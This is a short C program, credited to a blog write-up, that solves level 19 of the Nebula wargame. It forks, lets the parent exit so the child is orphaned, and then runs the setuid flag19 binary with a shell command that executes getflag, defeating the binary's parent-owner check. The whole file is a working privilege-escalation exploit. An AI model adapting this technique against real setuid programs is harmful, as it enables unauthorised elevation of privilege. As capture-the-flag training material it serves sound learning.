/* 
Credit: http://chrismeyers.org/2012/05/01/nebula-level-19/
 */
#include <unistd.h>     /* Symbolic Constants */
#include <sys/types.h>  /* Primitive System Data Types */
#include <errno.h>      /* Errors */
#include <stdio.h>      /* Input/Output */
#include <sys/wait.h>   /* Wait for Process Termination */
#include <stdlib.h>     /* General Utilities */

int main() {
    pid_t childpid; /* variable to store the child's pid */
    int retval;     /* child process: user-provided return code */
    int status;     /* parent process: child's exit status */

    childpid = fork();

    if (childpid >= 0) { // success
        if (childpid == 0) {    // child
            char cmd[] = "/home/flag19/flag19";
            char *argv[] = { "/bin/sh", "-c", "/bin/getflag > /home/flag19/test" };
            char *envp[] = { NULL };
            sleep(3);
            execve(cmd, argv, envp); // the parent has already terminated by now

        } else {    // parent
            //waitpid(childpid, &status, 0);
            sleep(1);
            exit(1);
        }
    }
}
